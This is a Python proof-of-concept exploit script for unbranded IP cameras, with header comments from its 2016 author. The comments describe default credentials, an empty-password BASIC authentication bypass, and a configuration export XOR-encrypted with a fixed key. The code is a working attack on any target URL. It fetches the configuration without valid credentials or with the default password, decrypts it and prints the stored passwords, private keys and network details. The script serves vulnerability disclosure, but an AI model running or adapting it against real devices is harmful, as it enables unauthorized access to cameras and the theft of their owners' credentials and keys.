
# Vulns found by: SkelSec (2016)
# PoC created by: SkelSec (2016)
# 
# This PoC exploits uses two separate vulnerabilites
#  0. -Not really a vuln- Default credentials are most likely not being changed. (admin - 123456)
#  1. Auth bypass: For some reason using BASIC authentication with empty username and password allows access to API endpoints. 
#       This vulnerability is not always present, some versions only use DIGEST auth.
#  2. Configuration file weak encryption: The configuration file can be downloaded via calling the "/ExportSetting" API endpoint.
#       The configuration file contains the plaintext username and password for all users, 
#       as well as the SSL certificates with private keys and private IP addresses etc.
#       However, the config file is encrypted. The encryption algo is XOR with the key 0x1D0F
#       This vulnerability is persistent among all versions I found so far.
#
# The vendor of these cameras is unknown, they come in all shapes and sizes 
# if you managed to identify the vendor pls drop a message so I may contact them.

import itertools
import string
import requests
from requests.auth import HTTPBasicAuth


KEY = b'\x1d\x0f'
def decrypt(data, key):
	res = ''
	for (c, x) in zip(data, itertools.cycle(key)):
		t = chr(ord(c) ^ x)
		if t in string.printable:
			res += t
		else:
			res += c
	return res

def fetch_settings(baseurl):
	if baseurl.endswith('/') is True:
		baseurl = baseurl[:-1]
	url = '%s/ExportSetting' % baseurl
	print('[+] Connectiong to %s' % url)
	r = requests.get(url, verify=False, auth=HTTPBasicAuth('', ''))
	if r.status_code != 200:
		print('[!] Failed to connect without auth! Reson: %s' % r.status_code)
		print('[-] Trying default password!')
		r = requests.get(url, verify=False, auth=HTTPBasicAuth('admin', '123456'))
		if r.status_code != 200:
			print('[!] Failed to connect with default password! Giving up on host! Reson: %s' % r.status_code)
			return None
	print('[+] Fetched encrypted config file!')
	return r.text

def exploit(baseurl):
	enc_settings = fetch_settings(baseurl)
	if enc_settings is None:
		print('[-] Terminating!')
		return
	
	settings = decrypt(enc_settings, KEY)
	print(settings)

def main():
	import argparse
	parser = argparse.ArgumentParser(description='Camera config fetcher and decryptor')
	parser.add_argument('baseurl', help='URL of the target server')
	args = parser.parse_args()

	exploit(args.baseurl)

if __name__ == '__main__':
	main()
